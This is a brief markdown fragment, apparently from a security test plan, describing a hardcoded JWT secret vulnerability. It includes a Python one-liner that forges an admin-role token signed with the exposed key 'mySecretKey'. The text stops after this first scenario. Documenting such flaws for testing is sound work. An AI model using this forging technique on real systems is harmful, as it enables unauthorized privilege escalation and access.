# JWT Token Security Vulnerabilities - Test Scenarios

## Vulnerability 1: Hardcoded Secret Key

### Exploitation
```bash
# The secret is "mySecretKey" - easily discoverable
# Generate fake admin token using the same secret
python3 -c "
import jwt
token = jwt.encode({'sub': 'hacker', 'role': 'admin'}, 'mySecretKey', algorithm='HS512')
print(token)
"
